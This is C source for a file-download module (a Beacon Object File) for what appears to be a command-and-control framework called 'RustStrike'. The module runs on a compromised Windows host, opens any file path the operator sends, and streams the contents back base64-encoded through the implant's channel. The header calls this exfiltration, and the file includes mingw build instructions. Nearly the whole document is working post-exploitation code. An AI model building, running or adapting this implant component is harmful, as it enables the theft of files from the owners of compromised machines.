/*
 * file_download BOF for RustStrike — exfiltrate a file as base64 (component format).
 *
 *   args: encodeBeaconString(path) — [2-byte LE length][UTF-8 path][null]
 *         as produced by FileBrowser.vue's downloadFile().
 *
 * Drives FileBrowser.vue. Output:
 *   === FILE: <path> (<N> bytes) ===\r\n
 *   <base64 of file bytes, streamed in 4096-char chunks>
 * The frontend strips the first line if it starts with "=== FILE:" and
 * base64-decodes the rest into a Blob, triggering a browser download.
 *
 * STREAMING (ported from bofs/file_ops/file_download.c): the file is read in
 * 3072-byte chunks and base64-encoded + emitted per chunk. 3072 is divisible
 * by 3, so every full chunk yields exactly 4096 base64 chars with NO padding —
 * only the final (partial) chunk gets '=' padding. Concatenating all chunks
 * produces valid contiguous base64 the frontend's atob() decodes whole. This
 * keeps BOF memory at ~7 KB of STACK (no 2 MB heap alloc) and raises the cap
 * to 10 MB. The whole output is still one line (the implant sends one message),
 * so the core's line buffer must be ≥ ~14 MB — see session.go.
 *
 * UNICODE SAFE: CreateFileW + MultiByteToWideChar so non-ASCII (Chinese, etc.)
 * paths open correctly. CreateFileA would mis-decode UTF-8 bytes as the ACP.
 *
 * Build (mingw):
 *   gcc -c examples/file_download.c -o examples/file_download.x64.o
 */
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
    DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);
DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);

#define CP_UTF8_ 65001
#define MAX_FILE  (10 * 1024 * 1024)   /* 10 MB cap (needs a ≥14 MB core line buffer) */
#define READ_CHUNK 3072                /* divisible by 3 -> exactly 4096 base64 chars, no mid-stream padding */

static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/* base64-encode `len` bytes of `src` into `dst`; returns chars written. */
static int b64encode(const unsigned char *src, int len, char *dst) {
    int o = 0, i = 0;
    for (; i + 2 < len; i += 3) {
        unsigned v = (src[i] << 16) | (src[i+1] << 8) | src[i+2];
        dst[o++] = B64[(v >> 18) & 63];
        dst[o++] = B64[(v >> 12) & 63];
        dst[o++] = B64[(v >> 6) & 63];
        dst[o++] = B64[v & 63];
    }
    int rem = len - i;
    if (rem == 1) {
        unsigned v = src[i] << 16;
        dst[o++] = B64[(v >> 18) & 63];
        dst[o++] = B64[(v >> 12) & 63];
        dst[o++] = '=';
        dst[o++] = '=';
    } else if (rem == 2) {
        unsigned v = (src[i] << 16) | (src[i+1] << 8);
        dst[o++] = B64[(v >> 18) & 63];
        dst[o++] = B64[(v >> 12) & 63];
        dst[o++] = B64[(v >> 6) & 63];
        dst[o++] = '=';
    }
    return o;
}

/* Parse the frontend's encodeBeaconString framing (2-byte LE len + bytes + NUL).
 * Falls back to raw text if the framing looks bogus. NUL-terminates out. */
static int read_bstr(char *args, int alen, int *off, char *out, int outcap) {
    if (alen < 2 || *off + 2 > alen) {
        int n = alen < outcap - 1 ? alen : outcap - 1;
        for (int i = 0; i < n; i++) out[i] = args[i];
        out[n] = 0;
        *off = alen;
        return n;
    }
    int len = (unsigned char)args[*off] | ((unsigned char)args[*off + 1] << 8);
    if (len <= 0 || len > alen - (*off + 2) + 1) {
        int n = alen < outcap - 1 ? alen : outcap - 1;
        for (int i = 0; i < n; i++) out[i] = args[i];
        out[n] = 0;
        *off = alen;
        return n;
    }
    *off += 2;
    int n = len < outcap - 1 ? len : outcap - 1;
    for (int i = 0; i < n; i++) out[i] = args[*off + i];
    out[n] = 0;
    if (n > 0 && out[n - 1] == 0) out[--n] = 0;
    *off += len;
    return n;
}

void go(char *args, int alen) {
    if (alen <= 0) { BeaconPrintf(CALLBACK_ERROR, "file_download: no path specified"); return; }

    char path[MAX_PATH];
    int off = 0;
    int plen = read_bstr(args, alen, &off, path, (int)sizeof(path));
    while (plen > 0 && (path[plen-1] == '\r' || path[plen-1] == '\n')) path[--plen] = 0;
    if (plen <= 0) { BeaconPrintf(CALLBACK_ERROR, "file_download: no path specified"); return; }

    /* Convert the UTF-8 path to UTF-16 so non-ASCII (Chinese, etc.) paths open
     * correctly. CreateFileA would mis-decode the bytes as the system ACP. */
    wchar_t wpath[MAX_PATH];
    int wl = KERNEL32$MultiByteToWideChar(CP_UTF8_, 0, path, -1, wpath, MAX_PATH);
    if (wl <= 0) { BeaconPrintf(CALLBACK_ERROR, "file_download: bad path encoding"); return; }

    HANDLE h = KERNEL32$CreateFileW(wpath, 0x80000000 /*GENERIC_READ*/, 1 /*FILE_SHARE_READ*/,
        NULL, 3 /*OPEN_EXISTING*/, 0x80 /*FILE_ATTRIBUTE_NORMAL*/, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "file_download: cannot open %s (%lu)", path, KERNEL32$GetLastError());
        return;
    }

    /* Pre-check size — reject files > 10 MB so we don't OOM the core's line
     * buffer mid-stream. GetFileSize fails for files > 4 GB on 32-bit DWORD;
     * that's fine (we cap at 10 MB anyway). */
    DWORD fileSize = KERNEL32$GetFileSize(h, NULL);
    int truncated = 0;
    if (fileSize == INVALID_FILE_SIZE) {
        /* can't determine size (e.g. pipe/device) — stream up to the cap */
        fileSize = 0;
    } else if (fileSize > MAX_FILE) {
        KERNEL32$CloseHandle(h);
        BeaconPrintf(CALLBACK_ERROR, "file_download: %s too large (%lu bytes, max %d)",
                     path, fileSize, MAX_FILE);
        return;
    }

    /* Header line — the frontend strips it when it starts with "=== FILE:".
     * Include the path and byte count for the operator log. */
    {
        char header[300];
        int hlen = MSVCRT$_snprintf(header, sizeof(header) - 1,
            "=== FILE: %s (%lu bytes) ===\r\n", path, fileSize);
        BeaconOutput(CALLBACK_OUTPUT, header, hlen);
    }

    /* Stream: read 3072-byte chunks, base64-encode (4096 chars, no padding
     * mid-stream), emit each via BeaconOutput. The loader concatenates all
     * BeaconOutput calls into one buffer, so the frontend receives one
     * contiguous base64 blob. Pure-ASCII output -> lossless UTF-8 round-trip. */
    unsigned char raw[READ_CHUNK];
    char b64[4100];   /* 4096 base64 chars + margin */
    DWORD total = 0, got = 0;
    while (total < MAX_FILE) {
        if (!KERNEL32$ReadFile(h, raw, READ_CHUNK, &got, NULL) || got == 0) break;
        int blen = b64encode(raw, (int)got, b64);
        BeaconOutput(CALLBACK_OUTPUT, b64, blen);
        total += got;
    }
    if (total >= MAX_FILE) truncated = 1;
    KERNEL32$CloseHandle(h);

    if (truncated) {
        BeaconPrintf(CALLBACK_ERROR, "file_download: truncated at %d bytes", MAX_FILE);
    }
}
